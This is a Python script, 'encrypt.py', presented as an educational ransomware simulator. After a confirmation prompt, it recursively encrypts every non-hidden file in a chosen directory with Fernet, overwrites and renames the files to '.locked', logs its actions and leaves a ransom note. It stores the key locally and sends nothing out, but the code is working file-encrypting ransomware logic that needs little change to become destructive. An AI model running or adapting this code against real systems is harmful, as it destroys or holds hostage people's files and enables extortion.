# encrypt.py (fully updated)
import os
import sys
from cryptography.fernet import Fernet
from datetime import datetime

# warning message
print("""\033[91m
WARNING: EDUCATIONAL USE ONLY
This ransomware simulator will encrypt files in the target directory.
DO NOT run on production systems or important files!
\033[0m""")
if input("Continue? (y/n): ").lower() != 'y':
    sys.exit(0)

# user-specified directory
target_dir = sys.argv[1] if len(sys.argv) > 1 else '.'

# logging
LOG_FILE = "ransom_simulator.log"
with open(LOG_FILE, "a") as log:
    log.write(f"\n\n--- Encryption started {datetime.now()} ---\n")

# recursive scanning + system file protection
files = []
for root, _, filenames in os.walk(target_dir):
    for file in filenames:
        filepath = os.path.join(root, file)
        
        # Skip protected files and our own files
        if file in ["encrypt.py", "decrypt.py", "Goddid.key", LOG_FILE]:
            continue
        if file.startswith('.') or file.endswith('.locked'):
            continue
            
        files.append(filepath)
        with open(LOG_FILE, "a") as log:
            log.write(f"Discovered: {filepath}\n")

# encryption/decryption key
key = Fernet.generate_key()
with open("Goddid.key", "wb") as keyfile:
    keyfile.write(key)

for filepath in files:
    try:
        # encryption logic
        with open(filepath, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(filepath, "wb") as thefile:
            thefile.write(contents_encrypted)
            
        # rename to .locked
        os.rename(filepath, filepath + ".locked")
        
        # logging
        with open(LOG_FILE, "a") as log:
            log.write(f"Encrypted: {filepath}\n")
    except Exception as e:
        with open(LOG_FILE, "a") as log:
            log.write(f"ERROR with {filepath}: {str(e)}\n")

# ransom note
RANSOM_NOTE = f"""Your files have been encrypted!

Simulation run at: {datetime.now()}
{len(files)} files were encrypted.

This is an educational exercise. To decrypt:
1. Place decrypt.py and Goddid.key in this directory
2. Run: python decrypt.py

DO NOT PAY REAL RANSOM!
"""
with open(os.path.join(target_dir, "README_RANSOM.txt"), "w") as note:
    note.write(RANSOM_NOTE)

print(f"Simulation complete! {len(files)} files encrypted.")
